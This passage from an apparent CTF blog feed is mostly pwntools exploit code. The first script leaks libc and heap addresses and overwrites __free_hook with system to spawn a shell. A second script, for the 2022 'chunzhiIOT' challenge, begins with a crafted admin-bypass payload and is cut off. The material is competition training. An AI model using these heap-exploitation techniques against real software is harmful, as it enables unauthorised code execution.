class=&#34;built_in&#34;&gt;print&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;get the GM permission!!!&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    r.sendlineafter(&lt;span class=&#34;string&#34;&gt;&amp;quot;Menu&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;1&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    r.sendlineafter(&lt;span class=&#34;string&#34;&gt;&amp;quot;Menu&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;1&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    r.sendlineafter(&lt;span class=&#34;string&#34;&gt;&amp;quot;Menu&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;1&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    r.sendlineafter(&lt;span class=&#34;string&#34;&gt;&amp;quot;Menu&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;4&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;selectuser&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;idx&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    r.sendlineafter(&lt;span class=&#34;string&#34;&gt;&amp;quot;Choice:&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;2&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    r.sendlineafter(&lt;span class=&#34;string&#34;&gt;&amp;quot;User?&amp;quot;&lt;/span&gt;,&lt;span class=&#34;built_in&#34;&gt;str&lt;/span&gt;(idx))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;manage&lt;/span&gt;():&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    r.sendlineafter(&lt;span class=&#34;string&#34;&gt;&amp;quot;Choice:&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;3&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;back&lt;/span&gt;():&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    r.sendlineafter(&lt;span class=&#34;string&#34;&gt;&amp;quot;Choice:&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;4&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;add&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;idx,size,text&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    r.sendlineafter(&lt;span class=&#34;string&#34;&gt;&amp;quot;Choice:&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;1&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    r.sendlineafter(&lt;span class=&#34;string&#34;&gt;&amp;quot;Id&amp;quot;&lt;/span&gt;,&lt;span class=&#34;built_in&#34;&gt;str&lt;/span&gt;(idx))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; size&amp;gt;=&lt;span class=&#34;number&#34;&gt;1000&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        r.sendafter(&lt;span class=&#34;string&#34;&gt;&amp;quot;Size&amp;quot;&lt;/span&gt;,&lt;span class=&#34;built_in&#34;&gt;str&lt;/span&gt;(size))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        r.sendlineafter(&lt;span class=&#34;string&#34;&gt;&amp;quot;Size&amp;quot;&lt;/span&gt;,&lt;span class=&#34;built_in&#34;&gt;str&lt;/span&gt;(size))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    r.sendafter(&lt;span class=&#34;string&#34;&gt;&amp;quot;Data&amp;quot;&lt;/span&gt;,text)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;edit&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;idx,text&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    r.sendlineafter(&lt;span class=&#34;string&#34;&gt;&amp;quot;Choice:&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;2&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    r.sendlineafter(&lt;span class=&#34;string&#34;&gt;&amp;quot;Change&amp;quot;&lt;/span&gt;,&lt;span class=&#34;built_in&#34;&gt;str&lt;/span&gt;(idx))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    r.sendafter(&lt;span class=&#34;string&#34;&gt;&amp;quot;Log&amp;quot;&lt;/span&gt;,text)   &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;free&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;idx&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    r.sendlineafter(&lt;span class=&#34;string&#34;&gt;&amp;quot;Choice:&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;3&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    r.sendlineafter(&lt;span class=&#34;string&#34;&gt;&amp;quot;lete&amp;quot;&lt;/span&gt;,&lt;span class=&#34;built_in&#34;&gt;str&lt;/span&gt;(idx))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;show&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;idx&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    back()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    selectuser(idx)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    r.sendlineafter(&lt;span class=&#34;string&#34;&gt;&amp;quot;Choice:&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;1&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    r.sendlineafter(&lt;span class=&#34;string&#34;&gt;&amp;quot;Menu&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;3&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    r.recvuntil(&lt;span class=&#34;string&#34;&gt;&amp;quot;Log:\nXXXXXXXX&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    addr = u64(r.recv(&lt;span class=&#34;number&#34;&gt;6&lt;/span&gt;).ljust(&lt;span class=&#34;number&#34;&gt;8&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;b&amp;#x27;\x00&amp;#x27;&lt;/span&gt;))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    r.sendlineafter(&lt;span class=&#34;string&#34;&gt;&amp;quot;Menu&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;4&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    manage()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; addr&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;getGM()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;#leak the libc&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;#gdb.attach(r,&amp;#x27;b malloc&amp;#x27;)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;manage()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;add(&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;0x410&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;b&amp;#x27;a&amp;#x27;&lt;/span&gt;*&lt;span class=&#34;number&#34;&gt;8&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;add(&lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;0x420&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;b&amp;#x27;b&amp;#x27;&lt;/span&gt;*&lt;span class=&#34;number&#34;&gt;8&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;add(&lt;span class=&#34;number&#34;&gt;3&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;0x4f0&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;b&amp;#x27;c&amp;#x27;&lt;/span&gt;*&lt;span class=&#34;number&#34;&gt;8&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;add(&lt;span class=&#34;number&#34;&gt;4&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;0x20&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;b&amp;#x27;d&amp;#x27;&lt;/span&gt;*&lt;span class=&#34;number&#34;&gt;8&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;free(&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;free(&lt;span class=&#34;number&#34;&gt;3&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;add(&lt;span class=&#34;number&#34;&gt;5&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;0x410&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;b&amp;#x27;d&amp;#x27;&lt;/span&gt;*&lt;span class=&#34;number&#34;&gt;7&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;add(&lt;span class=&#34;number&#34;&gt;6&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;0x4f0&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;b&amp;#x27;e&amp;#x27;&lt;/span&gt;*&lt;span class=&#34;number&#34;&gt;7&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;edit(&lt;span class=&#34;number&#34;&gt;5&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;b&amp;#x27;X&amp;#x27;&lt;/span&gt;*&lt;span class=&#34;number&#34;&gt;8&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;edit(&lt;span class=&#34;number&#34;&gt;6&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;b&amp;#x27;X&amp;#x27;&lt;/span&gt;*&lt;span class=&#34;number&#34;&gt;8&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;libc = show(&lt;span class=&#34;number&#34;&gt;6&lt;/span&gt;)-&lt;span class=&#34;number&#34;&gt;0x1ecbe0&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;heap = show(&lt;span class=&#34;number&#34;&gt;5&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;malloc_hook=libc +&lt;span class=&#34;number&#34;&gt;0x1ecb70&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;free_hook =libc + &lt;span class=&#34;number&#34;&gt;0x1eee48&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;system = libc + &lt;span class=&#34;number&#34;&gt;0x0522c0&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;onegadget = &lt;span class=&#34;number&#34;&gt;0xcafebabedeadbeef&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;built_in&#34;&gt;print&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;libc : &amp;quot;&lt;/span&gt;,&lt;span class=&#34;built_in&#34;&gt;hex&lt;/span&gt;(libc))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;built_in&#34;&gt;print&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;heap : &amp;quot;&lt;/span&gt;,&lt;span class=&#34;built_in&#34;&gt;hex&lt;/span&gt;(heap))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;free(&lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;add(&lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;0x3f0&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;b&amp;#x27;a&amp;#x27;&lt;/span&gt;*&lt;span class=&#34;number&#34;&gt;8&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;add(&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;0x28&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;b&amp;#x27;a&amp;#x27;&lt;/span&gt;*&lt;span class=&#34;number&#34;&gt;0x20&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;edit(&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;b&amp;#x27;a&amp;#x27;&lt;/span&gt;*&lt;span class=&#34;number&#34;&gt;0x20&lt;/span&gt;+p64(&lt;span class=&#34;number&#34;&gt;0x420&lt;/span&gt;))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;gdb.attach(r)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;edit(&lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;,p64(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;)+p64(&lt;span class=&#34;number&#34;&gt;0x421&lt;/span&gt;)+p64(heap-&lt;span class=&#34;number&#34;&gt;0x420&lt;/span&gt;)*&lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;free(&lt;span class=&#34;number&#34;&gt;6&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;add(&lt;span class=&#34;number&#34;&gt;6&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;0x3e0&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;b&amp;#x27;a&amp;#x27;&lt;/span&gt;*&lt;span class=&#34;number&#34;&gt;8&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;add(&lt;span class=&#34;number&#34;&gt;7&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;0x28&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;b&amp;#x27;x&amp;#x27;&lt;/span&gt;*&lt;span class=&#34;number&#34;&gt;8&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;free(&lt;span class=&#34;number&#34;&gt;4&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;free(&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;edit(&lt;span class=&#34;number&#34;&gt;7&lt;/span&gt;,p64(free_hook))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;add(&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;0x20&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;b&amp;#x27;/bin/sh\x00\x00&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;add(&lt;span class=&#34;number&#34;&gt;4&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;0x20&lt;/span&gt;,p64(system))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;free(&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;r.interactive()&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">http://example.com/2022/05/10/chunzhiIOT/</guid>
            <title>chunzhiIOT</title>
            <link>http://example.com/2022/05/10/chunzhiIOT/</link>
            <category>writeup</category>
            <pubDate>Tue, 10 May 2022 18:25:33 +0800</pubDate>
            <description><![CDATA[ &lt;h1 id=&#34;202205-春秋杯-个人赛-chunzhiiot&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#202205-春秋杯-个人赛-chunzhiiot&#34;&gt;#&lt;/a&gt; 202205 春秋杯 个人赛 ，chunzhiIOT&lt;/h1&gt;
&lt;h2 id=&#34;exp&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#exp&#34;&gt;#&lt;/a&gt; exp&lt;/h2&gt;
&lt;figure class=&#34;highlight python&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;38&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;39&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;40&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;41&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;42&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;43&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;44&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;45&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;46&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;47&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;48&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;49&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;50&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;51&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;52&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;53&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;54&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;55&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;56&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;57&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;58&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;59&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;60&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;61&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;62&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;63&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;64&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;65&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;66&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;67&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;68&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;69&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;70&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;71&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;72&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;73&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;74&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;75&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;76&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;77&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;78&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;79&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;80&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;81&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;82&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;83&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;84&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;85&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;86&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;87&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;88&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;89&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;90&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;91&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;from&lt;/span&gt; pwn &lt;span class=&#34;keyword&#34;&gt;import&lt;/span&gt; *&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;r=process(&lt;span class=&#34;string&#34;&gt;&amp;#x27;./pwn&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;#context.log_level = &amp;#x27;debug&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;elf = ELF(&lt;span class=&#34;string&#34;&gt;&amp;#x27;./pwn&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;libc= ELF(&lt;span class=&#34;string&#34;&gt;&amp;#x27;/home/dreamcat/glibc-all-in-one/libs/2.33-0ubuntu5_amd64/libc-2.33.so&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;getadmin&lt;/span&gt;():&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	payload = &lt;span class=&#34;string&#34;&gt;&amp;quot;DEV /root/src HTTP/1.1 \r\nrotartsinimda\x00  &amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	r.sendlineafter(&lt;span class=&#34;string&#34;&gt;&amp;quot;Waiting Package...&amp;quot;&lt;/span&gt;,payload)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;dbg&lt;/span&gt;():&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	gdb.attach(r)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	pause(&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span 